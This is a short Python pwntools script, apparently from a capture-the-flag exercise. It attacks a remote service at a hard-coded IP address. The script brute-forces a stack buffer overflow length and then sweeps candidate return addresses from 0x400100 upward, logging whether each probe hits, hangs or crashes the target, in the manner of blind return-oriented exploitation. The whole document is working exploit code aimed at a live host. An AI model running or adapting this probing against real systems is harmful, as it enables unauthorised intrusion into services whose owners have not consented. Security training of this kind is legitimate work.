from pwn import*
def get_overflow_length():
    i=1
    while 1:
        try:
            p=remote('123.59.196.133',10057)
            p.recvuntil('hacker, TNT!\n')
            p.send('a'*i)
            print("now trying length is "+str(i))
            res=p.recv()
            p.close()
            if b'TNT TNT!' not in res:
                return i-1
            else:
                i+=1
        except EOFError:
            p.close()
            return i-1
def probe(payload): 
    try:
        p=remote('123.59.196.133',10081)
        p.recv()
        p.send(payload)
        res=p.recv(timeout=3)
        if b"TNT" in res:
            return "success"
        else:
            return "stuck"
    except:
        return "crash"


os.remove('test.txt') 
test=open('test.txt','wt')
test.write('test:\n')
for i in range(256):
    print('trying'+str(i))
    test.write((hex(i)+'----->'+probe(b'a'*16+p64(0x400100+i)+p64(0x4000ce)+p64(0xffffff))+'\n'))
